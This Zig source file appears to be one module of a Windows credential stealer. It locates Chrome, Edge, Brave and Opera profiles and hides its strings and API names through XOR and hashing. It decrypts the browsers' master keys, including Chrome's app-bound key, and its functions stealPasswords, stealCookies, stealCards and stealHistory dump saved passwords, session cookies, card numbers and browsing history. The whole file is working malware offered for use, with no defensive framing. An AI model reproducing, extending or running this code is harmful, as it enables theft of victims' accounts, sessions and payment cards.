const std = @import("std");
const ajuste = @import("ajuste.zig");
const dpapi = @import("dpapi.zig");
const abe = @import("abe.zig");
const obf = @import("obf.zig");
const coleta = @import("coleta.zig");
const winfs = @import("winfs.zig");
const furtivo = @import("furtivo.zig");

// --- Minimal SQLite C API types and constants (no @cImport, no bundled amalgamation) ---

const SQLITE_OK: i32 = 0;
const SQLITE_ROW: i32 = 100;
const SQLITE_DONE: i32 = 101;

const sqlite3_open_fn = *const fn (path: [*:0]const u8, db: *?*anyopaque) callconv(.c) i32;
const sqlite3_prepare_v2_fn = *const fn (db: ?*anyopaque, sql: [*:0]const u8, nbyte: i32, stmt: *?*anyopaque, tail: ?*?[*:0]const u8) callconv(.c) i32;
const sqlite3_step_fn = *const fn (stmt: ?*anyopaque) callconv(.c) i32;
const sqlite3_column_text_fn = *const fn (stmt: ?*anyopaque, col: i32) callconv(.c) ?[*:0]const u8;
const sqlite3_column_blob_fn = *const fn (stmt: ?*anyopaque, col: i32) callconv(.c) ?*const anyopaque;
const sqlite3_column_bytes_fn = *const fn (stmt: ?*anyopaque, col: i32) callconv(.c) i32;
const sqlite3_column_int_fn = *const fn (stmt: ?*anyopaque, col: i32) callconv(.c) i32;
const sqlite3_finalize_fn = *const fn (stmt: ?*anyopaque) callconv(.c) i32;
const sqlite3_close_fn = *const fn (db: ?*anyopaque) callconv(.c) i32;

const SqliteFuncs = struct {
    open: sqlite3_open_fn,
    prepare_v2: sqlite3_prepare_v2_fn,
    step: sqlite3_step_fn,
    column_text: sqlite3_column_text_fn,
    column_blob: sqlite3_column_blob_fn,
    column_bytes: sqlite3_column_bytes_fn,
    column_int: sqlite3_column_int_fn,
    finalize: sqlite3_finalize_fn,
    close: sqlite3_close_fn,
};

/// Dynamically resolve SQLite functions from sqlite3.dll or winsqlite3.dll.
/// Windows 10+ ships winsqlite3.dll in System32. Many apps also bundle sqlite3.dll.
/// Returns null if SQLite cannot be loaded — caller should skip extraction gracefully.
fn resolveSqlite() ?SqliteFuncs {
    const k32_name = obf.xorStr("kernel32.dll");
    const k32 = furtivo.getModuleHandle(&k32_name);
    if (k32 == 0) return null;

    // Resolve LoadLibraryA so we can load DLLs that aren't already mapped
    const loadlib_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("LoadLibraryA")) catch 0;
    const LoadLibraryA = if (loadlib_addr != 0)
        @as(*const fn ([*:0]const u8) callconv(.winapi) usize, @ptrFromInt(loadlib_addr))
    else
        null;

    // Try module names in order: sqlite3.dll (already loaded?), winsqlite3.dll (already loaded?)
    const dll_names = [_][]const u8{
        &obf.xorStr("sqlite3.dll"),
        &obf.xorStr("winsqlite3.dll"),
    };

    var sqlite_base: usize = 0;
    for (dll_names) |dll_obf| {
        sqlite_base = furtivo.getModuleHandle(dll_obf);
        if (sqlite_base != 0) break;
    }

    // If not already loaded, try to load from System32
    if (sqlite_base == 0 and LoadLibraryA != null) {
        const try_paths = [_][]const u8{
            &obf.xorStr("C:\\Windows\\System32\\sqlite3.dll"),
            &obf.xorStr("C:\\Windows\\System32\\winsqlite3.dll"),
        };
        for (try_paths) |path_obf| {
            const path = obf.dexor(std.heap.page_allocator, path_obf) catch continue;
            defer std.heap.page_allocator.free(path);
            const path_z = std.heap.page_allocator.dupeZ(u8, path) catch continue;
            defer std.heap.page_allocator.free(path_z);
            sqlite_base = LoadLibraryA.?(path_z.ptr);
            if (sqlite_base != 0) break;
        }
    }

    if (sqlite_base == 0) return null;

    // Resolve all required function pointers
    const proc_hashes = [_]u32{
        comptime obf.apiHash("sqlite3_open"),
        comptime obf.apiHash("sqlite3_prepare_v2"),
        comptime obf.apiHash("sqlite3_step"),
        comptime obf.apiHash("sqlite3_column_text"),
        comptime obf.apiHash("sqlite3_column_blob"),
        comptime obf.apiHash("sqlite3_column_bytes"),
        comptime obf.apiHash("sqlite3_column_int"),
        comptime obf.apiHash("sqlite3_finalize"),
        comptime obf.apiHash("sqlite3_close"),
    };

    var addrs: [9]usize = undefined;
    for (proc_hashes, 0..) |ph, i| {
        addrs[i] = obf.getProcAddressByHash(sqlite_base, ph) catch 0;
        if (addrs[i] == 0) return null;
    }

    return SqliteFuncs{
        .open = @ptrFromInt(addrs[0]),
        .prepare_v2 = @ptrFromInt(addrs[1]),
        .step = @ptrFromInt(addrs[2]),
        .column_text = @ptrFromInt(addrs[3]),
        .column_blob = @ptrFromInt(addrs[4]),
        .column_bytes = @ptrFromInt(addrs[5]),
        .column_int = @ptrFromInt(addrs[6]),
        .finalize = @ptrFromInt(addrs[7]),
        .close = @ptrFromInt(addrs[8]),
    };
}

// Obfuscated browser info: names and base paths are XOR'd at comptime.
const BrowserInfo = struct {
    name_obf: []const u8,
    base_path_obf: []const u8,
    is_local: bool,
};

const browsers_obf = [_]BrowserInfo{
    .{ .name_obf = &obf.xorStr("Chrome"), .base_path_obf = &obf.xorStr("Google\\Chrome\\User Data"), .is_local = true },
    .{ .name_obf = &obf.xorStr("Edge"), .base_path_obf = &obf.xorStr("Microsoft\\Edge\\User Data"), .is_local = true },
    .{ .name_obf = &obf.xorStr("Brave"), .base_path_obf = &obf.xorStr("BraveSoftware\\Brave-Browser\\User Data"), .is_local = true },
    .{ .name_obf = &obf.xorStr("Opera"), .base_path_obf = &obf.xorStr("Opera Software\\Opera Stable"), .is_local = false },
    .{ .name_obf = &obf.xorStr("Opera GX"), .base_path_obf = &obf.xorStr("Opera Software\\Opera GX Stable"), .is_local = false },
};

pub fn getMasterKey(allocator: std.mem.Allocator, local_state_path: []const u8) ![]u8 {
    const buffer = try winfs.readFileAlloc(allocator, local_state_path, 10 * 1024 * 1024);
    defer allocator.free(buffer);

    const parsed = try std.json.parseFromSlice(std.json.Value, allocator, buffer, .{});
    defer parsed.deinit();

    const root = parsed.value.object;
    const os_crypt = root.get("os_crypt") orelse return error.OsCryptNotFound;

    // Chrome 127+ stores app-bound encrypted key in a separate field
    // Check for "app_bound_encrypted_key" first (APPB prefix path)
    if (os_crypt.object.get("app_bound_encrypted_key")) |abe_key_val| {
        const abe_key_b64 = abe_key_val.string;
        const decoder = std.base64.standard.Decoder;
        const abe_decoded_len = try decoder.calcSizeForSlice(abe_key_b64);
        const abe_decoded = try allocator.alloc(u8, abe_decoded_len);
        defer allocator.free(abe_decoded);
        try decoder.decode(abe_decoded, abe_key_b64);

        if (abe_decoded.len >= 4 and abe.isAppBoundKey(abe_decoded)) {
            // APPB path: decrypt via COM IElevator. If it fails (e.g. the
            // service is unavailable), fall through to the legacy DPAPI key so
            // v10 passwords are still recoverable.
            if (abe.decryptAppBoundKey(allocator, abe_decoded)) |key| {
                return key;
            } else |_| {}
        }
    }

    // Fall back to regular encrypted_key (DPAPI or APPB)
    const encrypted_key_val = os_crypt.object.get("encrypted_key") orelse return error.EncryptedKeyNotFound;
    const encrypted_key_b64 = encrypted_key_val.string;

    const decoder = std.base64.standard.Decoder;
    const decoded_len = try decoder.calcSizeForSlice(encrypted_key_b64);
    const decoded = try allocator.alloc(u8, decoded_len);
    defer allocator.free(decoded);
    try decoder.decode(decoded, encrypted_key_b64);

    if (decoded.len < 4) return error.InvalidKeyPrefix;

    // Check for "APPB" prefix (Chrome 127+ app-bound encryption)
    if (abe.isAppBoundKey(decoded)) {
        return try abe.decryptAppBoundKey(allocator, decoded);
    }

    // Check for "DPAPI" prefix (legacy path)
    if (decoded.len >= 5 and std.mem.eql(u8, decoded[0..5], "DPAPI")) {
        const encrypted_key = decoded[5..];
        return try dpapi.unprotectData(allocator, encrypted_key);
    }

    return error.InvalidKeyPrefix;
}

/// Delete a temp DB copy and SQLite's side-car files (-wal / -shm).
fn deleteDbArtifacts(allocator: std.mem.Allocator, db_path: []const u8) void {
    winfs.deleteFile(db_path) catch {};

    const wal = std.fmt.allocPrint(allocator, "{s}-wal", .{db_path}) catch return;
    defer allocator.free(wal);
    winfs.deleteFile(wal) catch {};

    const shm = std.fmt.allocPrint(allocator, "{s}-shm", .{db_path}) catch return;
    defer allocator.free(shm);
    winfs.deleteFile(shm) catch {};
}

fn copyDbToTemp(allocator: std.mem.Allocator, db_path: []const u8) ![]const u8 {
    // Copy to %TEMP% instead of next to the original in the browser profile
    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return error.TempNotFound;
    defer allocator.free(temp);

    // Generate a unique suffix using GetTickCount to avoid collisions.
    // Use the slice returned by bufPrint: it is not NUL-terminated, and
    // scanning the (uninitialized) buffer for a NUL would read OOB.
    var seed_buf: [16]u8 = undefined;
    var suffix: []const u8 = "pipeta_0";
    const k32 = furtivo.getModuleHandle(&obf.xorStr("kernel32.dll"));
    if (k32 != 0) {
        const gt_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetTickCount")) catch 0;
        if (gt_addr != 0) {
            const tick = @as(*const fn () callconv(.winapi) u32, @ptrFromInt(gt_addr))();
            suffix = std.fmt.bufPrint(&seed_buf, "pipeta_{x}", .{tick}) catch "pipeta_0";
        }
    }

    const temp_db = try std.fmt.allocPrint(allocator, "{s}\\pipeta_db_copy_{s}.tmp", .{ temp, suffix });
    errdefer allocator.free(temp_db);

    // Use copyFileShared to handle locked files (Chrome/Edge/Brave hold DBs open)
    winfs.copyFileShared(allocator, db_path, temp_db) catch {
        allocator.free(temp_db);
        return error.CopyFailed;
    };

    // Also copy WAL and SHM files if they exist (SQLite WAL mode)
    // SQLite will use the WAL file automatically when opening the copied DB
    const wal_src = std.fmt.allocPrint(allocator, "{s}-wal", .{db_path}) catch {
        return temp_db; // DB copy succeeded, WAL copy is best-effort
    };
    defer allocator.free(wal_src);
    const wal_dst = std.fmt.allocPrint(allocator, "{s}-wal", .{temp_db}) catch {
        return temp_db;
    };
    defer allocator.free(wal_dst);
    if (winfs.pathExists(wal_src)) {
        winfs.copyFileShared(allocator, wal_src, wal_dst) catch {};
    }

    const shm_src = std.fmt.allocPrint(allocator, "{s}-shm", .{db_path}) catch {
        return temp_db;
    };
    defer allocator.free(shm_src);
    const shm_dst = std.fmt.allocPrint(allocator, "{s}-shm", .{temp_db}) catch {
        return temp_db;
    };
    defer allocator.free(shm_dst);
    if (winfs.pathExists(shm_src)) {
        winfs.copyFileShared(allocator, shm_src, shm_dst) catch {};
    }

    return temp_db;
}

fn decryptValue(allocator: std.mem.Allocator, encrypted: []const u8, master_key: []const u8) ?[]u8 {
    if (encrypted.len > 15 and std.mem.eql(u8, encrypted[0..3], "v10")) {
        const iv = encrypted[3..15];
        const ciphertext = encrypted[15..];
        return dpapi.decryptAESGCM(allocator, master_key, iv, ciphertext) catch null;
    }
    if (encrypted.len > 3 + 32 + 12 + 16 and std.mem.eql(u8, encrypted[0..3], "v20")) {
        // v20 format: "v20" (3) + SHA256(domain) (32) + nonce (12) + ciphertext+tag
        const iv = encrypted[3 + 32 .. 3 + 32 + 12];
        const ciphertext = encrypted[3 + 32 + 12 ..];
        return dpapi.decryptAESGCM(allocator, master_key, iv, ciphertext) catch null;
    }
    if (encrypted.len > 0) {
        return dpapi.unprotectData(allocator, encrypted) catch null;
    }
    return null;
}

pub fn stealPasswords(allocator: std.mem.Allocator, db_path: []const u8, master_key: []const u8, browser: []const u8, col: *coleta.Coleta) void {
    const sql = resolveSqlite() orelse return;

    const temp_db = copyDbToTemp(allocator, db_path) catch return;
    defer {
        deleteDbArtifacts(allocator, temp_db);
        allocator.free(temp_db);
    }

    const db_path_z = allocator.dupeZ(u8, temp_db) catch return;
    defer allocator.free(db_path_z);

    var db: ?*anyopaque = null;
    if (sql.open(db_path_z.ptr, &db) != SQLITE_OK) return;
    defer _ = sql.close(db);

    const query = "SELECT origin_url, username_value, password_value FROM logins";
    var stmt: ?*anyopaque = null;
    if (sql.prepare_v2(db, query, -1, &stmt, null) != SQLITE_OK) return;
    defer _ = sql.finalize(stmt);

    while (sql.step(stmt) == SQLITE_ROW) {
        const url_ptr = sql.column_text(stmt, 0);
        const user_ptr = sql.column_text(stmt, 1);
        const pass_blob = sql.column_blob(stmt, 2);
        const pass_len = sql.column_bytes(stmt, 2);

        if (url_ptr == null or user_ptr == null or pass_blob == null or pass_len <= 0) continue;

        const url = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(url_ptr.?)), 0);
        const user = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(user_ptr.?)), 0);
        const encrypted_pass = @as([*]const u8, @ptrCast(pass_blob.?))[0..@intCast(pass_len)];

        const decrypted = decryptValue(allocator, encrypted_pass, master_key) orelse continue;
        defer allocator.free(decrypted);
        const plain = coleta.sanitizeUtf8(allocator, decrypted) catch continue;

        col.senhas.append(allocator, .{
            .url = allocator.dupe(u8, url) catch {
                allocator.free(plain);
                continue;
            },
            .usuario = allocator.dupe(u8, user) catch {
                allocator.free(plain);
                continue;
            },
            .senha = plain,
            .navegador = allocator.dupe(u8, browser) catch {
                allocator.free(plain);
                continue;
            },
        }) catch {
            allocator.free(plain);
            continue;
        };
    }
}

pub fn stealCookies(allocator: std.mem.Allocator, db_path: []const u8, master_key: []const u8, browser: []const u8, col: *coleta.Coleta) void {
    const sql = resolveSqlite() orelse return;

    const temp_db = copyDbToTemp(allocator, db_path) catch return;
    defer {
        deleteDbArtifacts(allocator, temp_db);
        allocator.free(temp_db);
    }

    const db_path_z = allocator.dupeZ(u8, temp_db) catch return;
    defer allocator.free(db_path_z);

    var db: ?*anyopaque = null;
    if (sql.open(db_path_z.ptr, &db) != SQLITE_OK) return;
    defer _ = sql.close(db);

    const query = "SELECT host_key, name, encrypted_value FROM cookies";
    var stmt: ?*anyopaque = null;
    if (sql.prepare_v2(db, query, -1, &stmt, null) != SQLITE_OK) return;
    defer _ = sql.finalize(stmt);

    while (sql.step(stmt) == SQLITE_ROW) {
        const host_ptr = sql.column_text(stmt, 0);
        const name_ptr = sql.column_text(stmt, 1);
        const val_blob = sql.column_blob(stmt, 2);
        const val_len = sql.column_bytes(stmt, 2);

        if (host_ptr == null or name_ptr == null or val_blob == null or val_len <= 0) continue;

        const host = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(host_ptr.?)), 0);
        const name = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(name_ptr.?)), 0);
        const encrypted_val = @as([*]const u8, @ptrCast(val_blob.?))[0..@intCast(val_len)];

        const decrypted = decryptValue(allocator, encrypted_val, master_key) orelse continue;
        defer allocator.free(decrypted);
        const plain = coleta.sanitizeUtf8(allocator, decrypted) catch continue;

        col.cookies.append(allocator, .{
            .host = allocator.dupe(u8, host) catch {
                allocator.free(plain);
                continue;
            },
            .nome = allocator.dupe(u8, name) catch {
                allocator.free(plain);
                continue;
            },
            .valor = plain,
            .navegador = allocator.dupe(u8, browser) catch {
                allocator.free(plain);
                continue;
            },
        }) catch {
            allocator.free(plain);
            continue;
        };
    }
}

pub fn stealCards(allocator: std.mem.Allocator, db_path: []const u8, master_key: []const u8, browser: []const u8, col: *coleta.Coleta) void {
    const sql = resolveSqlite() orelse return;

    const temp_db = copyDbToTemp(allocator, db_path) catch return;
    defer {
        deleteDbArtifacts(allocator, temp_db);
        allocator.free(temp_db);
    }

    const db_path_z = allocator.dupeZ(u8, temp_db) catch return;
    defer allocator.free(db_path_z);

    var db: ?*anyopaque = null;
    if (sql.open(db_path_z.ptr, &db) != SQLITE_OK) return;
    defer _ = sql.close(db);

    const query = "SELECT card_number_encrypted, expiration_month, expiration_year, name_on_card FROM credit_cards";
    var stmt: ?*anyopaque = null;
    if (sql.prepare_v2(db, query, -1, &stmt, null) != SQLITE_OK) return;
    defer _ = sql.finalize(stmt);

    while (sql.step(stmt) == SQLITE_ROW) {
        const num_blob = sql.column_blob(stmt, 0);
        const num_len = sql.column_bytes(stmt, 0);
        const month_ptr = sql.column_text(stmt, 1);
        const year_ptr = sql.column_text(stmt, 2);
        const name_ptr = sql.column_text(stmt, 3);

        if (num_blob == null or num_len <= 0) continue;

        const encrypted_num = @as([*]const u8, @ptrCast(num_blob.?))[0..@intCast(num_len)];
        const decrypted = decryptValue(allocator, encrypted_num, master_key) orelse continue;
        defer allocator.free(decrypted);
        const plain = coleta.sanitizeUtf8(allocator, decrypted) catch continue;

        const month_str = if (month_ptr != null) std.mem.sliceTo(@as([*:0]const u8, @ptrCast(month_ptr.?)), 0) else "";
        const year_str = if (year_ptr != null) std.mem.sliceTo(@as([*:0]const u8, @ptrCast(year_ptr.?)), 0) else "";
        const name_str = if (name_ptr != null) std.mem.sliceTo(@as([*:0]const u8, @ptrCast(name_ptr.?)), 0) else "";

        col.cartoes.append(allocator, .{
            .numero = plain,
            .validade = std.fmt.allocPrint(allocator, "{s}/{s}", .{ month_str, year_str }) catch continue,
            .titular = allocator.dupe(u8, name_str) catch continue,
            .navegador = allocator.dupe(u8, browser) catch continue,
        }) catch continue;
    }
}

pub fn stealHistory(allocator: std.mem.Allocator, db_path: []const u8, browser: []const u8, col: *coleta.Coleta) void {
    const sql = resolveSqlite() orelse return;

    const temp_db = copyDbToTemp(allocator, db_path) catch return;
    defer {
        deleteDbArtifacts(allocator, temp_db);
        allocator.free(temp_db);
    }

    const db_path_z = allocator.dupeZ(u8, temp_db) catch return;
    defer allocator.free(db_path_z);

    var db: ?*anyopaque = null;
    if (sql.open(db_path_z.ptr, &db) != SQLITE_OK) return;
    defer _ = sql.close(db);

    const query = "SELECT url, title, visit_count FROM urls";
    var stmt: ?*anyopaque = null;
    if (sql.prepare_v2(db, query, -1, &stmt, null) != SQLITE_OK) return;
    defer _ = sql.finalize(stmt);

    while (sql.step(stmt) == SQLITE_ROW) {
        const url_ptr = sql.column_text(stmt, 0);
        const title_ptr = sql.column_text(stmt, 1);
        const visit_count = sql.column_int(stmt, 2);

        if (url_ptr == null) continue;

        const url = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(url_ptr.?)), 0);
        const title = if (title_ptr != null) std.mem.sliceTo(@as([*:0]const u8, @ptrCast(title_ptr.?)), 0) else "";

        col.historico.append(allocator, .{
            .url = allocator.dupe(u8, url) catch continue,
            .titulo = allocator.dupe(u8, title) catch continue,
            .visitas = @intCast(visit_count),
            .navegador = allocator.dupe(u8, browser) catch continue,
        }) catch continue;
    }
}

pub fn tudo(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    // Early check: if we can't load SQLite, skip all browser extraction gracefully
    const sql = resolveSqlite() orelse return;
    _ = sql;

    const local_app_data = furtivo.getEnvVar(allocator, "LOCALAPPDATA") catch return;
    defer allocator.free(local_app_data);
    const app_data = furtivo.getEnvVar(allocator, "APPDATA") catch return;
    defer allocator.free(app_data);

    for (browsers_obf) |b| {
        // Dexor browser name and base path at runtime
        const b_name = obf.dexor(allocator, b.name_obf) catch continue;
        defer allocator.free(b_name);
        const b_path = obf.dexor(allocator, b.base_path_obf) catch continue;
        defer allocator.free(b_path);

        const root_path = if (b.is_local) local_app_data else app_data;
        const full_path = std.fs.path.join(allocator, &[_][]const u8{ root_path, b_path }) catch continue;
        defer allocator.free(full_path);

        if (!winfs.pathExists(full_path)) continue;

        const local_state = std.fs.path.join(allocator, &[_][]const u8{ full_path, "Local State" }) catch continue;
        defer allocator.free(local_state);

        const master_key = getMasterKey(allocator, local_state) catch continue;
        defer allocator.free(master_key);

        var dir_iter = winfs.DirIter.open(full_path) orelse continue;
        defer dir_iter.deinit();

        while (dir_iter.next(allocator)) |entry| {
            defer allocator.free(entry.name);
            if (!entry.is_dir) continue;
            if (!std.mem.startsWith(u8, entry.name, "Default") and !std.mem.startsWith(u8, entry.name, "Profile")) continue;

            const profile_path = std.fs.path.join(allocator, &[_][]const u8{ full_path, entry.name }) catch continue;
            defer allocator.free(profile_path);

            // Senhas
            const login_data = std.fs.path.join(allocator, &[_][]const u8{ profile_path, "Login Data" }) catch continue;
            defer allocator.free(login_data);
            if (winfs.pathExists(login_data))
                stealPasswords(allocator, login_data, master_key, b_name, col);

            // Cookies (Chrome 96+ moved to <profile>\Network\Cookies)
            const cookies_network = std.fs.path.join(allocator, &[_][]const u8{ profile_path, "Network", "Cookies" }) catch continue;
            if (winfs.pathExists(cookies_network)) {
                stealCookies(allocator, cookies_network, master_key, b_name, col);
                allocator.free(cookies_network);
            } else {
                allocator.free(cookies_network);
                // Fall back to old location (<profile>\Cookies)
                const cookies_db = std.fs.path.join(allocator, &[_][]const u8{ profile_path, "Cookies" }) catch continue;
                defer allocator.free(cookies_db);
                if (winfs.pathExists(cookies_db))
                    stealCookies(allocator, cookies_db, master_key, b_name, col);
            }

            // Cartoes
            const web_data = std.fs.path.join(allocator, &[_][]const u8{ profile_path, "Web Data" }) catch continue;
            defer allocator.free(web_data);
            if (winfs.pathExists(web_data))
                stealCards(allocator, web_data, master_key, b_name, col);

            // Historico
            const history_db = std.fs.path.join(allocator, &[_][]const u8{ profile_path, "History" }) catch continue;
            defer allocator.free(history_db);
            if (winfs.pathExists(history_db))
                stealHistory(allocator, history_db, b_name, col);
        }
    }
}
